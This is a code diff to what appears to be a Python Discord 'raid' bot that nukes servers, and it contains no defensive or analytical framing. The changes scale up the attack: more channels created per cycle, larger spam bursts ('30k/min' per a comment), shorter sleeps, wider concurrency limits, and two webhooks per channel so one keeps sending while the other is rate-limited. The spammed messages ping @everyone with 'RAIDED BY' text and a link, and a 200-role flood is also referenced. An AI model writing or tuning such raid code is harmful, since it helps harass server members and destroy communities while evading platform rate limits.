@@ -34,11 +34,12 @@ RAID_NAME = f"RAIDED BY {RAID_TAG}"
 CHANNEL_CAP      = 490
 CREATORS         = 5
 ROLE_FLOOD_MAX   = 200
-SPAM_BURST       = 3    # messages sent per semaphore slot acquisition
-CREATE_PER_CYCLE = 50   # channels built per nuke cycle before looping back
+SPAM_BURST       = 5    # messages sent per semaphore slot acquisition
+CREATE_PER_CYCLE = 100  # channels built per nuke cycle (100 ch × 5 msg/s = 500/s = 30k/min)
+WEBHOOKS_PER_CH  = 2    # 2 webhooks per channel — when one hits 429 and sleeps, other fires
 
-_SPAM_SEM = asyncio.Semaphore(35)
-_WH_SEM   = asyncio.Semaphore(25)
+_SPAM_SEM = asyncio.Semaphore(50)
+_WH_SEM   = asyncio.Semaphore(30)
 
 _MSGS = [
     f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
@@ -295,7 +296,8 @@ class Raid(commands.Cog):
                                 created.append(ch)
                             print(f"[nuke] cycle {cycle} created #{name} ({len(created)})", flush=True)
                             bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
-                            bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))
+                            for _ in range(WEBHOOKS_PER_CH):
+                                bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))
                         except asyncio.TimeoutError:
                             await asyncio.sleep(5.0)
                         except discord.Forbidden:
@@ -403,7 +405,7 @@ class Raid(commands.Cog):
                 return
             except Exception:
                 return
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(0.05)
 
     # ─────────────────────────────────────────────────────────────────────────
     # ROLE FLOOD — create 200 raid roles concurrently
